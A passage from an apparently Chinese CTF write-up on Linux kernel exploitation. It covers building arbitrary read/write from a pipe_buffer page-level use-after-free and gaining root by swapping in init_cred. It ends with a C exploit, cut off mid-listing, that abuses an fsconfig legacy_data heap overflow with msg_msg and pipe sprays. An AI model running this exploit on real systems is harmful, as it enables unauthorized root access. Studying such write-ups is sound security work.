或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）</p><p>但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 <code>pipe_buffer</code> 进行读写，我们可以<strong>继续构造出第二级的 page-level UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>为什么要这么做呢？在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，<strong>且与物理内存页一一对应</strong>，试想若是我们可以不断地修改一个 pipe 的 page 指针，<strong>则我们便能完成对整个内存空间的任意读写</strong>，因此接下来我们要完成这样的一个利用系统的构造</p><p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，<strong>由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 pipe_buffer 的 page 指针指向自身，从而直接完成对自身的修改</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>这里我们可以篡改 <code>pipe_buffer.offset</code> 与 <code>pipe_buffer.len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值，因此这里我们使用<strong>三个管道</strong>：</p><ul><li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成 ：）</li><li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li><li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置、第二个管道的写入起始位置指向第三个管道</li></ul><p>通过这三个管道之间互相循环修改，我们便<strong>实现了一个可以在内存空间中进行近乎无限制的任意读写系统</strong> ：）</p><h3 id="Step-IV-提权"><a href="#Step-IV-提权" class="headerlink" title="Step.IV - 提权"></a>Step.IV - 提权</h3><p>有了内存空间中的任意读写，提权便是非常简便的一件事情了，这里笔者选择通过修改当前进程的 task_struct 的 cred 为 init_cred 的方式来完成提权</p><p><code>init_cred</code> 为有着 root 权限的 cred，我们可以直接将当前进程的 cred 修改为该 cred 以完成提权，这里iwom可以通过 <code>prctl(PR_SET_NAME, &quot;&quot;);</code> 修改 <code>task_struct.comm</code> ，从而方便搜索当前进程的 <code>task_struct</code> 在内存空间中的位置：）</p><p>不过 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的，我们在调试时未必能够获得其地址，因此这里笔者选择通过解析 <code>task_struct</code> 的方式向上一直找到 <code>init</code> 进程（所有进程的父进程）的 <code>task_struct</code> ，从而获得 <code>init_cred</code> 的地址</p><h3 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first byte of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prepare_oob_write</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (0x1000 - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SZ    (0x1000+0x20-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OOB_READ_SZ    (0x2000-sizeof(struct msg_msg)-sizeof(struct msg_msgseg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE 0x41414141</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_SPRAY_NR 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR MSG_SPRAY_NR</span><br><br><span class="hljs-type">int</span> msqid[MSG_SPRAY_NR];<br><span class="hljs-type">int</span> seq_fd[SEQ_SPRAY_NR];<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fs_fd, victim_qidx = <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief We don&#x27;t need to leak anything here, we just need to occupy a 4k obj.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">occupy_4k_obj_by_msg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>], ktext_leak = <span class="hljs-number">-1</span>;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage I - corrupting msg_msg to leak kernel info and occupy a 4k obj&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating pipe...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at creating %d pipe.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, MSG_SZ, MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at writing %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating fs-&gt;legacy_data...&quot;</span>);<br>    fs_fd = prepare_oob_write();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating msg_queue and msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_SPRAY_NR - <span class="hljs-number">8</span>); i &lt; MSG_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = get_msg_queue()) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed at allocating %d queue.\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br><br>        buf[<span class="hljs-number">0</span>] = i;<br>        buf[MSG_SZ / <span class="hljs-number">8</span>] = i;<br>        <span class="hljs-keyword">if</span> (write_msg(msqid[i], buf, 